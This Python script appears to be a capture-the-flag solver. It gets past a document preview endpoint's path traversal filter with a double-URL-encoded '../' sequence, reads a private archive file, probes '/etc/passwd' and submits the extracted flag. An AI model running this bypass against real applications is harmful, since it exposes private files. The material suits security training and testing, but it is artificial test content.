from __future__ import annotations

import re
from urllib.parse import urljoin

import requests


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    home = client.get(target_url + "/", timeout=20)
    assert home.status_code == 200
    documents_path = re.search(r"href=['\"]([^'\"]*/documents)['\"]", home.text).group(1)
    notes_path = re.search(r"href=['\"]([^'\"]*/migration-notes)['\"]", home.text).group(1)
    documents = client.get(urljoin(target_url, documents_path), timeout=20)
    assert documents.status_code == 200
    links = re.findall(r"href=['\"]([^'\"]*/documents/([^'\"]+))['\"]", documents.text)
    assert links
    normal_id = next(document_id for href, document_id in links if document_id != "migration-record")
    migration_id = next(document_id for href, document_id in links if document_id == "migration-record")
    normal_page = client.get(urljoin(target_url, f"/documents/{normal_id}"), timeout=20)
    preview_link = re.search(r"href=['\"]([^'\"]*/preview\?[^'\"]+)['\"]", normal_page.text).group(1)
    preview_url = urljoin(target_url, preview_link)
    assert client.get(preview_url, timeout=20).status_code == 200
    assert client.get(urljoin(target_url, notes_path), timeout=20).status_code == 200

    migration_page = client.get(urljoin(target_url, f"/documents/{migration_id}"), timeout=20)
    migration_link = re.search(r"href=['\"]([^'\"]*/preview\?[^'\"]+)['\"]", migration_page.text).group(1)
    migration_url = urljoin(target_url, migration_link)
    migration_content = client.get(migration_url, timeout=20).text
    reference = re.search(r"legacy_archive_ref:\s*(private/[A-Za-z0-9._-]+\.txt)", migration_content).group(1)
    filename = reference.split("/", 1)[1]
    parameter = re.search(r"[?&]([^=&]+)=", migration_url).group(1)
    preview_base = migration_url.split("?", 1)[0]

    plain = f"{preview_base}?{parameter}=public/../private/{filename}"
    single_encoded = f"{preview_base}?{parameter}=public/%2e%2e/private/{filename}"
    assert client.get(plain, timeout=20).status_code == 403
    assert client.get(single_encoded, timeout=20).status_code == 403

    double_encoded = f"{preview_base}?{parameter}=public/%252e%252e/private/{filename}"
    archive = client.get(double_encoded, timeout=20)
    assert archive.status_code == 200
    flag = re.search(r"flag\{[^}]+\}", archive.text).group(0)
    assert client.get(f"{preview_base}?{parameter}=/etc/passwd", timeout=20).status_code == 403
    if control_url and instance_id:
        result = requests.post(control_url + f"/api/v1/instances/{instance_id}/submit", json={"flag": flag}, timeout=20).json()
        assert result["data"]["correct"]
    return flag
